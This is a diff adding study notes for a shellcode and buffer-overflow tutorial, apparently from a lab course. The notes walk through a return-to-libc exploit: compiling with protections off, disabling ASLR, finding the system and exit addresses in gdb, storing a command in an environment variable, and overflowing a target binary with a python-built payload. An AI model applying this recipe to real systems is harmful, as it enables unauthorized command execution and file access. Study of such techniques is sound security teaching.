@@ -116,5 +116,21 @@ minni tutorial  - injecting shell code
 __________________________________________________________________
 
 
-			
+Getting envir variable to work
+
+		1. compile with -fno-stack-protector -z execstack
+		2. need to run echo 0 > /proc/sys/kernel/randomize_va_space
+		3. in gdb find the system and exit addresses
+			a. open gdb with code
+			b. break at main
+			c. p &system
+			d. p &exit
+			e. get the addresses for both
+		4. run 'export ATHACK=cat\ /home/DIRECTORY AND FILES WANT TO CAT'
+		5. echo $ATHACK
+			makes sure that it is there.
+		6. ./getenv ATHACK ./FILEWEARETRYINGTOEXPLOIT
+		5. ./FILEWEAREEXPLOITING $(python -c 'print "a" * 22 + SYSTEM ADDRESS EXIT ADDRESS ADDRESS FOR ATHACK"')
+			example './4runMe $(python -c 'print "a" * 22 + "\x30\x4c\xd7\xb7\x70\x82\xd6\xb7\xf7\xfe\xff\xbf"')'
+
 			
